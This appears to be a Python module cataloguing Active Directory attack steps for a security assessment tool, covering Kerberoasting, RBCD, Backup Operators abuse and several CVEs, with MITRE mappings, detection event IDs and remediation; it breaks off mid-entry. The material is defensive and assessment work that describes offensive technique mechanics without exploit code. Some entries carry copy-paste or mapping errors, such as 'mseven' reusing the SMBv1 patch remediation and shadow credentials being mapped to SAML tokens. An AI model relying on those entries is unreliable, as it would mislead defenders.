"""Canonical attack-step catalog.

This module centralizes known attack-step relations and their metadata so the CLI,
graph services, and reporting layers can share one source of truth.

Scope:
- Execution support classification (supported, unsupported, policy_blocked, context)
- Human-readable relation notes for UX
- Optional CTEM vulnerability key mapping for exploitation-style relations
- Remediation complexity, effort, and full-mitigation flag per step
- MITRE ATT&CK technique mapping per step
- Windows Event IDs for SOC detection per step
- BloodHound CE native edge flag and Cypher type names

remediation_complexity values:
  low        – Single GPO/registry/ACL change, minimal testing required.
  medium     – Configuration change requiring planning and testing; possible service impact.
  high       – Significant infrastructure change or architectural limitation; operational risk.
  very_high  – Requires architecture overhaul, PKI rebuild, or has persistent attacker capability.

can_fully_mitigate:
  True   – The step can be fully eliminated from attack paths.
  False  – The step is architecturally inherent to Windows AD (e.g., unconstrained delegation
           on DCs); the risk can only be reduced, not eliminated.

bh_native / bh_cypher_names:
  bh_native=True means the edge exists natively in BloodHound CE's graph (added by its
  collectors). Such edges are NOT uploaded via OpenGraph — they are already present.
  bh_cypher_names lists the exact PascalCase Cypher relationship type(s) used in BH CE
  queries. Some catalog entries map to multiple BH CE variants (e.g. ADCSESC6a/6b).
  ADscan-custom relations (LocalAdminPassReuse, Timeroasting, DumpLSA, etc.) have
  bh_native=False and are NOT included in BH CE Cypher queries.
"""

from __future__ import annotations

import re
from dataclasses import dataclass, replace
from functools import lru_cache
from typing import Any, Literal


SupportKind = Literal["supported", "unsupported", "policy_blocked", "context"]
ExecutionTargetAccessRequirement = Literal["none", "computer_reachable"]
# Orthogonal to SupportKind / CompromiseSemantics: does the step SUCCEED outright
# (deterministic — a write / ACL edit / delegation primitive) or only if a
# recovered secret cracks or a guess lands (probabilistic — Kerberoasting,
# AS-REP Roasting, password spraying)? Governs the collapsed-pivot execution UX:
# probabilistic → multi-select (try several candidates, one crack is enough);
# deterministic → single-select (one destructive change is enough).
ExecutionDeterminism = Literal["deterministic", "probabilistic"]
# Orthogonal to SupportKind: what makes this step a CLIENT FINDING when ADscan
# did not execute it. ``support_kind`` answers "can ADscan run this"; this
# answers "if it did not run, is there still an exposure in the client's
# directory to report". The two are routinely confused, and conflating them is
# what let a step ADscan simply cannot perform be billed as a critical finding.
#
# * ``observed_configuration`` (DEFAULT) — the edge exists because ADscan READ a
#   misconfiguration out of the directory (a permissive ACL, a vulnerable
#   certificate template, an unconstrained-delegation flag). The weakness is
#   real whether or not ADscan can exploit it, so a not-assessed execution
#   status never erases the finding. This is the safe default: a new relation
#   that forgets to declare the axis keeps its finding.
# * ``execution_outcome`` — the edge is an AVENUE ADscan hypothesised, not a
#   misconfiguration it observed; the only proof it leads anywhere is execution.
#   When every one of its edges is not-assessed there is nothing observed to
#   report, and recording an open finding would bill the client for a gap in
#   ADscan's coverage.
FindingBasis = Literal["observed_configuration", "execution_outcome"]
CompromiseSemantics = Literal[
    "direct_target_compromise",
    "access_capability_only",
    "context_only",
    "credential_access_only",
    "other",
]
CompromiseEffort = Literal[
    "none",
    "immediate",
    "low",
    "medium",
    "high",
    "other",
]
SourceContextRequirement = Literal[
    "user_credentials",      # DEFAULT — any authenticated principal (most edges)
    "none",                  # No auth needed (coercion, ASREPRoasting, Timeroasting)
    "local_admin_session",   # Admin shell on host required (dump-type edges)
    "machine_credential",    # Machine account TGT/hash required (AllowedToDelegate, RBCD)
    "mssql_rce_session",     # OS-command RCE channel on the SQL host (XpCmdshell)
                             # established. Required by the MSSQL SYSTEM-escalation
                             # follow-ups (SeImpersonate / token-theft), which run
                             # THROUGH that channel and are recorded only after it
                             # (mssql.py:run_xpcmdshell_system_escalation_followup).
]

_COMPLEXITY_ORDER: dict[str, int] = {"low": 0, "medium": 1, "high": 2, "very_high": 3}


@dataclass(frozen=True, slots=True)
class AttackStepCatalogEntry:
    """Definition for one attack-step relation."""

    relation: str
    support_kind: SupportKind
    support_reason: str
    compromise_semantics: CompromiseSemantics
    compromise_effort: CompromiseEffort
    category: str
    description: str
    vuln_key: str | None = None
    remediation_complexity: str = "medium"  # low | medium | high | very_high
    remediation_effort: str = ""
    can_fully_mitigate: bool = True
    mitre_technique_id: str | None = None  # e.g. "T1558.003"
    mitre_technique_name: str | None = (
        None  # e.g. "Steal or Forge Kerberos Tickets: Kerberoasting"
    )
    detection_event_ids: tuple[str, ...] = ()  # Windows Event IDs for SOC detection
    bh_native: bool = False  # True = edge exists natively in BloodHound CE's graph
    bh_cypher_names: tuple[
        str, ...
    ] = ()  # Cypher relationship type(s) for BH CE queries
    is_acl_edge: bool = (
        False  # True = ACL/ACE-derived object-control or extended-right edge
    )
    execution_relation_alias: str | None = None  # canonical execution-family relation
    requires_execution_context: bool = False
    counts_for_execution_readiness: bool = False
    execution_target_access_requirement: ExecutionTargetAccessRequirement = "none"
    # Whether this step's success is crack/guess-gated (probabilistic) or
    # succeeds outright (deterministic). Default deterministic — the conservative
    # single-destructive-action choice; only crack/spray relations set this.
    execution_determinism: ExecutionDeterminism = "deterministic"
    # What makes this step a client finding when it was not executed. See
    # :data:`FindingBasis`. Consumed by the attack-graph → finding derivation.
    finding_basis: FindingBasis = "observed_configuration"
    # BloodHound-style narrative templates with placeholders.
    # Placeholders resolved at render time by render_step_narrative():
    #   {source}      — display name of source principal
    #   {target}      — display name of target principal
    #   {source_type} — "user" | "computer" | "group" | "domain" | "service account"
    #   {target_type} — same, for the destination
    #   {template}    — ADCS template name (if applicable; "" otherwise)
    #   {relation}    — human-formatted relation label (e.g. "Kerberoasting")
    # Long form: used in attack-path narratives section of the report.
    narrative_template: str = ""
    # Short form: one-liner used in cards / chips / tooltips (web + PDF).
    short_narrative_template: str = ""
    # Manual command a learner can run BY HAND with the standard offensive tool
    # (nxc / certipy / impacket / bloodyAD / rubeus, whichever is canonical for
    # this technique) to reproduce this step without ADscan. Consumed ONLY by the
    # interactive didactic mode (``deep`` level) so a junior on an HTB box — or a
    # senior meeting an unfamiliar attack — learns the by-hand equivalent. Keep it
    # a real, copy-pasteable invocation with ``<placeholder>`` tokens for the
    # values ADscan resolves at runtime (target, user, DC IP, template). Empty
    # string = no manual equivalent authored yet (the didactic card omits the
    # section). See CLAUDE.md § "ADscan is also a LEARNING tool".
    manual_command: str = ""
    # Independent-verification commands so the CLIENT can confirm the finding by
    # hand (killing the false-positive objection). Unlike the vendor-neutral
    # remediation prose, this DEDICATED verification block MAY name STANDARD
    # verification tools — never competitors. Two perspectives:
    #   verify_windows — native Microsoft / PowerShell (certutil, Get-ADUser,
    #     Get-Acl, dsacls, Get-ADObject, Get-SmbServerConfiguration): the
    #     preferred, sysadmin-runnable check.
    #   verify_linux — the standard offensive tool from a Linux box (nxc /
    #     netexec, certipy, impacket, bloodyAD) OR a thehacker.recipes reference
    #     URL for the technique.
    # Both accept the same placeholder set as narrative_template. Empty = not yet
    # authored (the verification block is omitted). See CLAUDE.md
    # § "Baked technique narratives" for the scoped exception this field carves.
    verify_windows: str = ""
    verify_linux: str = ""
    # Structured remediation steps (ordered). Each string may also contain
    # the same placeholder set as narrative_template.
    remediation_steps: tuple[str, ...] = ()
    # What credential/session context the *source* principal must have before
    # this edge can be traversed.  Used by the DFS to block semantically-wrong
    # chains (e.g. AdminTo → AllowedToDelegate).
    source_context_requirement: SourceContextRequirement = "user_credentials"
    # What credential/session context this edge PRODUCES for the next edge in the
    # path, overriding the default derived from ``compromise_semantics`` (see
    # :func:`provides_context_for_entry`).  Only set when the semantics-derived
    # context is too coarse — e.g. ``XpCmdshell`` produces an ``mssql_rce_session``
    # that the MSSQL SYSTEM-escalation follow-ups require, which the generic
    # ``direct_target_compromise`` → ``credential_recovered`` mapping cannot express.
    provides_context: str | None = None


def _entry(
    relation: str,
    *,
    support_kind: SupportKind,
    support_reason: str,
    compromise_semantics: CompromiseSemantics = "other",
    compromise_effort: CompromiseEffort = "other",
    category: str,
    description: str,
    vuln_key: str | None = None,
    remediation_complexity: str = "medium",
    remediation_effort: str = "",
    can_fully_mitigate: bool = True,
    mitre_technique_id: str | None = None,
    mitre_technique_name: str | None = None,
    detection_event_ids: tuple[str, ...] = (),
    bh_native: bool = False,
    bh_cypher_names: tuple[str, ...] = (),
    is_acl_edge: bool = False,
    execution_relation_alias: str | None = None,
    requires_execution_context: bool = False,
    counts_for_execution_readiness: bool = False,
    execution_target_access_requirement: ExecutionTargetAccessRequirement = "none",
    execution_determinism: ExecutionDeterminism = "deterministic",
    finding_basis: FindingBasis = "observed_configuration",
    narrative_template: str = "",
    short_narrative_template: str = "",
    manual_command: str = "",
    verify_windows: str = "",
    verify_linux: str = "",
    remediation_steps: tuple[str, ...] = (),
    source_context_requirement: SourceContextRequirement = "user_credentials",
    provides_context: str | None = None,
) -> AttackStepCatalogEntry:
    """Build a normalized catalog entry."""
    return AttackStepCatalogEntry(
        relation=str(relation or "").strip().lower(),
        support_kind=support_kind,
        support_reason=support_reason,
        compromise_semantics=compromise_semantics,
        compromise_effort=compromise_effort,
        category=category,
        description=description,
        vuln_key=vuln_key,
        remediation_complexity=remediation_complexity,
        remediation_effort=remediation_effort,
        can_fully_mitigate=can_fully_mitigate,
        mitre_technique_id=mitre_technique_id,
        mitre_technique_name=mitre_technique_name,
        detection_event_ids=detection_event_ids,
        bh_native=bh_native,
        bh_cypher_names=bh_cypher_names,
        is_acl_edge=is_acl_edge,
        execution_relation_alias=(
            str(execution_relation_alias or "").strip().lower() or None
        ),
        requires_execution_context=requires_execution_context,
        counts_for_execution_readiness=counts_for_execution_readiness,
        execution_target_access_requirement=execution_target_access_requirement,
        execution_determinism=execution_determinism,
        finding_basis=finding_basis,
        narrative_template=narrative_template.strip(),
        short_narrative_template=short_narrative_template.strip(),
        manual_command=manual_command.strip(),
        verify_windows=verify_windows.strip(),
        verify_linux=verify_linux.strip(),
        remediation_steps=tuple(remediation_steps),
        source_context_requirement=source_context_requirement,
        provides_context=provides_context,
    )


_CATALOG_ENTRIES: tuple[AttackStepCatalogEntry, ...] = (
    # ── Context / expansion ─────────────────────────────────────────────────
    _entry(
        "memberof",
        support_kind="context",
        support_reason="Context only (membership expansion); not executed",
        compromise_semantics="context_only",
        compromise_effort="none",
        category="context",
        description="Group membership pivot used for path expansion",
        remediation_complexity="low",
        remediation_effort="Remove the user/group from the over-privileged group.",
        can_fully_mitigate=True,
        # No MITRE — pure graph context node, not an attack technique
        bh_native=True,
        bh_cypher_names=("MemberOf",),
    ),
    _entry(
        "privilegedgroupcontrol",
        support_kind="unsupported",
        support_reason="Membership-derived direct control outcome; no separate execution step",
        compromise_semantics="direct_target_compromise",
        compromise_effort="immediate",
        category="privilege",
        description="Direct control achieved through membership in a terminal privileged group",
        remediation_complexity="low",
        remediation_effort="Remove the principal from the privileged control group.",
        can_fully_mitigate=True,
        mitre_technique_id="T1098",
        mitre_technique_name="Account Manipulation",
    ),
    _entry(
        "backupoperatorescalation",
        support_kind="supported",
        support_reason=(
            "Backup Operators rights are used to read the SAM, SECURITY, and SYSTEM "
            "registry hives over the network and recover the domain controller's "
            "machine account hash."
        ),
        compromise_semantics="direct_target_compromise",
        compromise_effort="medium",
        category="privilege",
        description="Domain compromise via Backup Operators: remote registry hive extraction → DC machine account hash",
        remediation_complexity="medium",
        remediation_effort="Remove unnecessary membership from Backup Operators and constrain backup privileges.",
        can_fully_mitigate=True,
        mitre_technique_id="T1003.002",
        mitre_technique_name="OS Credential Dumping: Security Account Manager",
        detection_event_ids=("4656", "4663", "4624"),
    ),
    _entry(
        "printoperatorabuse",
        support_kind="unsupported",
        support_reason="Print Operators follow-up is modeled but not executed automatically yet",
        compromise_semantics="access_capability_only",
        compromise_effort="medium",
        category="privilege",
        description="Potential escalation path unlocked by Print Operators membership",
        remediation_complexity="medium",
        remediation_effort="Remove unnecessary membership from Print Operators and restrict DC local execution paths.",
        can_fully_mitigate=True,
        mitre_technique_id="T1547.006",
        mitre_technique_name="Boot or Logon Autostart Execution: Kernel Modules and Extensions",
    ),
    _entry(
        "dnsadminabuse",
        support_kind="policy_blocked",
        support_reason="DNSAdmins abuse is intentionally blocked in production-safe execution mode",
        compromise_semantics="direct_target_compromise",
        compromise_effort="medium",
        category="privilege",
        description="Potential domain compromise path via DNSAdmins abuse",
        remediation_complexity="medium",
        remediation_effort="Remove unnecessary DNSAdmins membership and harden DNS administration workflows.",
        can_fully_mitigate=True,
        mitre_technique_id="T1543.003",
        mitre_technique_name="Create or Modify System Process: Windows Service",
    ),
    _entry(
        "preparerodccredentialcaching",
        support_kind="supported",
        support_reason="RODC PRP preparation is supported through the dedicated RODC follow-up workflow",
        compromise_semantics="access_capability_only",
        compromise_effort="high",
        category="privilege",
        description="Prepare RODC credential caching by modifying the RODC password-replication policy",
        remediation_complexity="high",
        remediation_effort="Remove unnecessary RODC PRP delegation and review all principals allowed to modify RODC password-replication policy.",
        can_fully_mitigate=True,
        mitre_technique_id="T1098",
        mitre_technique_name="Account Manipulation",
    ),
    _entry(
        "extractrodckrbtgtsecret",
        support_kind="supported",
        support_reason="RODC per-krbtgt extraction is supported through the dedicated follow-up workflow",
        compromise_semantics="credential_access_only",
        compromise_effort="high",
        category="credential_access",
        description="Extract the per-RODC krbtgt secret from the compromised RODC",
        remediation_complexity="high",
        remediation_effort="Prevent unauthorized RODC host access and monitor RODC memory/LSA extraction activity closely.",
        can_fully_mitigate=False,
        mitre_technique_id="T1003",
        mitre_technique_name="OS Credential Dumping",
    ),
    _entry(
        "forgerodcgoldenticket",
        support_kind="supported",
        support_reason="RODC golden ticket forging is supported once per-RODC krbtgt material exists",
        compromise_semantics="credential_access_only",
        compromise_effort="high",
        category="kerberos",
        description="Forge a reusable RODC golden ticket from recovered per-RODC krbtgt material",
        remediation_complexity="high",
        remediation_effort="Rotate affected per-RODC krbtgt material and investigate unauthorized Kerberos ticket creation.",
        can_fully_mitigate=False,
        mitre_technique_id="T1558.001",
        mitre_technique_name="Steal or Forge Kerberos Tickets: Golden Ticket",
    ),
    _entry(
        "kerberoskeylist",
        support_kind="supported",
        support_reason="Kerberos Key List is supported when AES material is available for the per-RODC krbtgt account",
        compromise_semantics="direct_target_compromise",
        compromise_effort="high",
        category="kerberos",
        description="Use the forged RODC golden ticket to request Key List data from a writable domain controller",
        remediation_complexity="high",
        remediation_effort="Review and reset replicated target credentials, rotate per-RODC krbtgt material, and investigate Key List abuse activity.",
        can_fully_mitigate=False,
        mitre_technique_id="T1558",
        mitre_technique_name="Steal or Forge Kerberos Tickets",
    ),
    _entry(
        "localadminpassreuse",
        support_kind="context",
        support_reason="Observed local admin password reuse pivot; no direct execution step",
        compromise_semantics="context_only",
        compromise_effort="none",
        category="lateral_movement",
        description="Credential reuse pivot between hosts sharing local admin credentials",
        remediation_complexity="medium",
        remediation_effort=(
            "Deploy LAPS to ensure unique local administrator passwords on every machine. "
            "Rotate local admin credentials on all affected hosts immediately."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1078.003",
        mitre_technique_name="Valid Accounts: Local Accounts",
        detection_event_ids=("4624", "4648"),
        bh_cypher_names=("LocalAdminPassReuse",),
    ),
    _entry(
        "localcredreusesource",
        support_kind="context",
        support_reason="Observed host where the reused local credential was recovered",
        compromise_semantics="context_only",
        compromise_effort="none",
        category="context",
        description="Host-to-credential-cluster context edge used for SAM reuse correlation",
        remediation_complexity="medium",
        remediation_effort=(
            "Prevent credential extraction from endpoints by hardening local admin usage, "
            "deploying EDR protections, and reducing local admin privileges."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1003.002",
        mitre_technique_name="OS Credential Dumping: Security Account Manager",
        detection_event_ids=("4688", "4656"),
        bh_cypher_names=("LocalCredReuseSource",),
    ),
    _entry(
        "localcredtodomainreuse",
        support_kind="context",
        support_reason="Observed local credential reused successfully against domain account(s)",
        compromise_semantics="context_only",
        compromise_effort="none",
        category="credential_access",
        description="Credential reuse pivot from local credential material to domain identity",
        remediation_complexity="medium",
        remediation_effort=(
            "Eliminate shared credential patterns between local and domain accounts. "
            "Enforce unique strong passwords and rotate exposed credentials."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1078.002",
        mitre_technique_name="Valid Accounts: Domain Accounts",
        detection_event_ids=("4624", "4648", "4768", "4769"),
        bh_cypher_names=("LocalCredToDomainReuse",),
    ),
    _entry(
        "domainpassreusesource",
        support_kind="context",
        support_reason="Observed source user participating in a reused domain password cluster",
        compromise_semantics="context_only",
        compromise_effort="none",
        category="context",
        description="Source principal for password/hash reuse between domain users",
        remediation_complexity="medium",
        remediation_effort=(
            "Eliminate password reuse between domain accounts and enforce unique secrets per identity."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1078.002",
        mitre_technique_name="Valid Accounts: Domain Accounts",
        detection_event_ids=("4624", "4768", "4769"),
        bh_cypher_names=("DomainPassReuseSource",),
    ),
    _entry(
        "domainpassreuse",
        support_kind="context",
        support_reason="Observed domain users sharing the same password/hash material",
        compromise_semantics="context_only",
        compromise_effort="none",
        category="credential_access",
        description="Domain account credential reuse pivot through clustered shared secret material",
        remediation_complexity="medium",
        remediation_effort=(
            "Enforce unique random passwords for every domain user and rotate all accounts in the reuse cluster."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1078.002",
        mitre_technique_name="Valid Accounts: Domain Accounts",
        detection_event_ids=("4624", "4648", "4768", "4769"),
        bh_cypher_names=("DomainPassReuse",),
    ),
    _entry(
        "hassession",
        support_kind="supported",
        support_reason="Executable via schtask_as session abuse workflow",
        # ACCESS edge (EdgeKind.AUTH): arriving at the session user is NOT
        # ownership — you can only LEVERAGE the session once you have local admin
        # on the host. The actual compromise is a follow-up the session unlocks
        # (ScheduledTask-as-user or DumpLSASS), modelled as a derived self-loop on
        # the session user by _build_implicit_session_followup_overlay. So the
        # semantics is access_capability_only (provides local_admin_session →
        # the follow-up chains), NOT a credential-bearing compromise on its own.
        compromise_semantics="access_capability_only",
        # Abusing a session (schtask-as-user / LSASS dump of the session) needs
        # LOCAL ADMIN on the host. So HasSession chains DIRECTLY off a local-admin
        # access (AdminTo, AllowedToDelegate, Ntlmv1RelayRBCD, ReadLAPSPassword —
        # all access_capability_only → provide local_admin_session), as a sibling
        # of the DumpLSA host bridge — NOT after DumpLSA (a redundant prerequisite)
        # and NOT after a user-level CanRDP/CanPSRemote session (those are
        # context-transparent, so the guard evaluates HasSession against the
        # pre-pivot context, which does not provide local_admin_session).
        source_context_requirement="local_admin_session",
        category="privilege",
        description=(
            "High-value user session observed on a non-Tier-0 computer that can be "
            "abused for scheduled-task impersonation"
        ),
        vuln_key="da_sessions",
        remediation_complexity="medium",
        remediation_effort=(
            "Restrict Domain Admin logons to Tier 0 assets only. "
            "Use PAWs for privileged operations and prohibit DA logons on member servers/workstations. "
            "Enforce ESAE/PAW model and monitor tier-zero session exposure."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1053.005",
        mitre_technique_name="Scheduled Task/Job: Scheduled Task",
        detection_event_ids=("4624", "4672"),
        bh_native=True,
        bh_cypher_names=("HasSession",),
        execution_target_access_requirement="computer_reachable",
    ),
    # ── Network exploitation / CVEs ─────────────────────────────────────────
    _entry(
        "zerologon",
        support_kind="policy_blocked",
        support_reason="High-risk / potentially disruptive (disabled by design)",
        category="cve",
        description="Netlogon cryptographic flaw exploitation path",
        source_context_requirement="none",
        vuln_key="zerologon",
        remediation_complexity="low",
        remediation_effort=(
            "Apply CVE-2020-1472 patch and enforce full Secure Channel enforcement "
            "(FullSecureChannelProtection=1 registry key on all DCs)."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1210",
        mitre_technique_name="Exploitation of Remote Services",
        detection_event_ids=("4742",),
        bh_cypher_names=("Zerologon",),
    ),
    _entry(
        "nopac",
        support_kind="policy_blocked",
        support_reason="High-risk / potentially disruptive (disabled by design)",
        category="cve",
        description="NoPac domain takeover path",
        source_context_requirement="none",
        vuln_key="nopac",
        remediation_complexity="low",
        remediation_effort=(
            "Apply November 2021 Patch Tuesday updates (KB5008380 / KB5008602). "
            "Set ms-DS-MachineAccountQuota=0 to prevent domain users from creating machine accounts."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1068",
        mitre_technique_name="Exploitation for Privilege Escalation",
        detection_event_ids=("4741", "4742", "4768", "4769"),
        bh_cypher_names=("NoPAC",),
    ),
    _entry(
        "printnightmare",
        support_kind="policy_blocked",
        support_reason="High-risk / potentially disruptive (disabled by design)",
        category="cve",
        description="PrintNightmare privileged code execution path",
        vuln_key="printnightmare",
        remediation_complexity="medium",
        remediation_effort=(
            "Apply CVE-2021-34527 patch. Disable the Print Spooler service on all DCs. "
            "If DC-side printing is required, enforce Point and Print restrictions via GPO."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1068",
        mitre_technique_name="Exploitation for Privilege Escalation",
        detection_event_ids=("316",),
        bh_cypher_names=("PrintNightmare",),
    ),
    _entry(
        "ms17-010",
        support_kind="unsupported",
        support_reason="Not implemented yet in ADscan",
        category="cve",
        description="EternalBlue SMBv1 remote code execution path",
        vuln_key="ms17-010",
        remediation_complexity="low",
        remediation_effort=(
            "Apply MS17-010 patch (KB4012212 or later). "
            "Disable SMBv1 on all systems via GPO "
            "(Set-SmbServerConfiguration -EnableSMB1Protocol $false)."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1210",
        mitre_technique_name="Exploitation of Remote Services",
        detection_event_ids=(),
        bh_cypher_names=("MS17010",),
    ),
    _entry(
        "mseven",
        support_kind="unsupported",
        support_reason="Not implemented yet in ADscan",
        source_context_requirement="none",
        category="cve",
        description="MSEven coercion-style authentication trigger path",
        vuln_key="mseven",
        remediation_complexity="low",
        remediation_effort=(
            "Apply MS17-010 patch (KB4012212 or later). "
            "Disable SMBv1 on all systems via GPO "
            "(Set-SmbServerConfiguration -EnableSMB1Protocol $false)."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1187",
        mitre_technique_name="Forced Authentication",
        detection_event_ids=("4768",),
        bh_cypher_names=("MSEven",),
    ),
    # ── Kerberos ────────────────────────────────────────────────────────────
    _entry(
        "allowedtodelegate",
        support_kind="supported",
        support_reason="Kerberos constrained delegation enumeration/exploitation",
        compromise_semantics="access_capability_only",
        source_context_requirement="user_credentials",
        category="delegation",
        description="Abuse AllowedToDelegate paths to impersonate users to delegated services",
        vuln_key="constrained_delegation",
        remediation_complexity="high",
        remediation_effort=(
            "Audit msDS-AllowedToDelegateTo and remove unnecessary delegated SPNs. "
            "Restrict protocol transition (TrustedToAuthForDelegation) to services that require it. "
            "Mark privileged and sensitive accounts as 'Account is sensitive and cannot be delegated'."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1558",
        mitre_technique_name="Steal or Forge Kerberos Tickets",
        detection_event_ids=("4769",),
        bh_native=True,
        bh_cypher_names=("AllowedToDelegate",),
    ),
    _entry(
        "allowedtoact",
        support_kind="supported",
        support_reason=(
            "Resource-based constrained delegation (inbound RBCD). The target "
            "computer's msDS-AllowedToActOnBehalfOfOtherIdentity grants delegation "
            "to a trustee (often a group). With a controlled SPN-bearing principal "
            "that is, or can be added, a member of that trustee, S4U2Self+S4U2Proxy "
            "as that principal mints a service ticket against the target impersonating "
            "a privileged user (e.g. a Domain Admin), then an altservice sname rewrite "
            "yields the cifs/http/ldap family. Deterministic. No offline crack."
        ),
        compromise_semantics="direct_target_compromise",
        compromise_effort="low",
        source_context_requirement="machine_credential",
        category="delegation",
        description="Resource-based constrained delegation attack path",
        vuln_key="rbcd_exploitable",
        remediation_complexity="medium",
        remediation_effort=(
            "Remove or clear the msDS-AllowedToActOnBehalfOfOtherIdentity attribute "
            "on the target computer object. Restrict write access to this attribute."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1134.001",
        mitre_technique_name="Access Token Manipulation: Token Impersonation/Theft",
        detection_event_ids=("4769", "5136"),
        bh_native=True,
        bh_cypher_names=("AllowedToAct",),
        is_acl_edge=False,
        requires_execution_context=True,
        execution_target_access_requirement="computer_reachable",
    ),
    _entry(
        "coercetotgt",
        support_kind="unsupported",
        support_reason="Not implemented yet in ADscan",
        category="delegation",
        description="Coerce a target into providing a usable TGT for delegation abuse",
        vuln_key="unconstrained_delegation",
        remediation_complexity="medium",
        remediation_effort=(
            "Block authentication coercion by disabling vulnerable RPC endpoints. "
            "Enable EPA on LDAP and ADCS. Mark sensitive accounts as delegation-exempt."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1187",
        mitre_technique_name="Forced Authentication",
        detection_event_ids=("4768", "4769"),
        bh_native=True,
        bh_cypher_names=("CoerceToTGT",),
    ),
    _entry(
        "kerberoasting",
        support_kind="supported",
        execution_determinism="probabilistic",
        support_reason="Extract and crack Kerberos TGS hashes for a target user",
        compromise_semantics="direct_target_compromise",
        compromise_effort="high",
        category="kerberos",
        description="Offline crack service ticket material for credential recovery",
        vuln_key="kerberoast",
        remediation_complexity="medium",
        remediation_effort=(
            "Migrate SPN-bearing service accounts to Group Managed Service Accounts (gMSA). "
            "Where not possible: use 25+ char random passwords, enforce AES encryption, "
            "and restrict SPN-bearing accounts to least privilege."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1558.003",
        mitre_technique_name="Steal or Forge Kerberos Tickets: Kerberoasting",
        detection_event_ids=("4769",),
        bh_cypher_names=("Kerberoasting",),
    ),
    _entry(
        "asreproasting",
        support_kind="supported",
        execution_determinism="probabilistic",
        support_reason="Extract and crack Kerberos AS-REP hashes for a target user",
        compromise_semantics="direct_target_compromise",
        compromise_effort="high",
        source_context_requirement="none",
        category="kerberos",
        description="Offline crack AS-REP material from users without preauth",
        vuln_key="asreproast",
        remediation_complexity="low",
        remediation_effort=(
            "Enable Kerberos pre-authentication on all accounts "
            "(UF_DONT_REQUIRE_PREAUTH must not be set)."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1558.004",
        mitre_technique_name="Steal or Forge Kerberos Tickets: AS-REP Roasting",
        detection_event_ids=("4768",),
        bh_cypher_names=("ASREPRoasting",),
    ),
    _entry(
        "timeroasting",
        support_kind="supported",
        execution_determinism="probabilistic",
        support_reason="Extract and crack MS-SNTP machine-account material",
        source_context_requirement="none",
        category="credential_access",
        description="Offline crack MS-SNTP challenge material from machine accounts",
        remediation_complexity="medium",
        remediation_effort=(
            "Keep automatic machine-account password rotation enabled. Reset or rejoin "
            "computer accounts that were manually assigned weak passwords, and "
            "investigate stale machine passwords that have not rotated in 30 days."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1110.002",
        mitre_technique_name="Brute Force: Password Cracking",
        bh_cypher_names=("Timeroasting",),
    ),
    _entry(
        "HasShadowCredentials",
        support_kind="supported",
        support_reason=(
            "Object already has msDS-KeyCredentialLink. Authenticate via PKINIT "
            "to retrieve NT hash without knowing the account password"
        ),
        compromise_semantics="direct_target_compromise",
        compromise_effort="low",
        category="credential_access",
        description=(
            "Existing shadow credentials allow PKINIT authentication "
            "and NT hash retrieval"
        ),
        vuln_key="shadow_credentials_present",
        remediation_complexity="medium",
        remediation_effort=(
            "Audit all msDS-KeyCredentialLink values via LDAP. "
            "Remove unexpected entries. Enable Event ID 5136 auditing on the "
            "msDS-KeyCredentialLink attribute. Deploy Windows Hello for Business "
            "only through sanctioned Group Policy."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1606.002",
        mitre_technique_name="Forge Web Credentials: SAML Tokens",
        detection_event_ids=("5136",),
        bh_cypher_names=("HasShadowCredentials",),
        remediation_steps=(
            "Enumerate every object carrying a key credential: "
            "Get-ADObject -LDAPFilter '(msDS-KeyCredentialLink=*)' "
            "-Properties msDS-KeyCredentialLink | "
            "Select-Object DistinguishedName, msDS-KeyCredentialLink",
            "Remove unexpected entries: "
            "Set-ADObject -Identity <DN> -Clear msDS-KeyCredentialLink",
            "Enable DS Access auditing on msDS-KeyCredentialLink (Event ID 5136) "
            "in Default Domain Controller Policy.",
            "Legitimate WHfB entries are created by the DC. Entries from "
            "non-DC principals are suspicious.",
        ),
    ),
    # ── Lateral movement / execution ────────────────────────────────────────
    _entry(
        "adminto",
        support_kind="supported",
        support_reason="Confirm local admin access via SMB (AdminTo)",
        compromise_semantics="access_capability_only",
        compromise_effort="medium",
        category="lateral_movement",
        description="Administrative access from one principal to a host",
        remediation_complexity="medium",
        remediation_effort=(
            "Remove local administrator rights from non-privileged accounts on target machines. "
            "Deploy LAPS for local admin password management. "
            "Implement tiered access model (PAWs for admin tasks)."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1021.002",
        mitre_technique_name="Remote Services: SMB/Windows Admin Shares",
        detection_event_ids=("4624", "4648", "4672"),
        bh_native=True,
        bh_cypher_names=("AdminTo",),
        execution_target_access_requirement="computer_reachable",
    ),
    _entry(
        "sqlaccess",
        support_kind="supported",
        support_reason="Confirm MSSQL authenticated access (SQLAccess)",
        compromise_semantics="access_capability_only",
        compromise_effort="medium",
        category="lateral_movement",
        description="Authenticated access over MSSQL without confirmed sysadmin-level control",
        remediation_complexity="medium",
        remediation_effort=(
            "Remove unnecessary SQL login access for the identified principal. "
            "Audit Windows-integrated SQL logins and limit who can connect to SQL Server instances."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1078",
        mitre_technique_name="Valid Accounts",
        detection_event_ids=("4624",),
        bh_cypher_names=("SQLAccess",),
        execution_relation_alias="sqladmin",
        execution_target_access_requirement="computer_reachable",
    ),
    _entry(
        "sqladmin",
        support_kind="supported",
        support_reason="Confirm MSSQL administrative access (SQLAdmin)",
        compromise_semantics="access_capability_only",
        compromise_effort="medium",
        category="lateral_movement",
        description="Administrative access over MSSQL control surface",
        remediation_complexity="medium",
        remediation_effort=(
            "Remove sysadmin or db_owner rights from the identified SQL login. "
            "Audit SQL Server logins and Windows-integrated authentication principals."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1078",
